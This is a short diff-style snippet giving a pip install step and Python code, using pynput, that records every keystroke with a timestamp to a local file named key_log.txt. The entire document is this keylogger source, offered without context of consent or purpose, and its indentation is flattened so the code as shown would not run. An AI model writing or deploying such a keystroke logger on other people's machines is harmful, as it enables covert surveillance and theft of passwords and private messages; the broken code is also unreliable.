@@ -1,0 +1,11 @@
+For Installing:- pip install pynput 
+Code: 
+from pynput.keyboard import Key, Listener 
+import logging 
+# Set up logging to store keystrokes 
+log_file = "key_log.txt" 
+logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s') 
+def on_press(key): 
+logging.info(str(key)) # Logs each key pressed 
+with Listener(on_press=on_press) as listener: 
+listener.join()
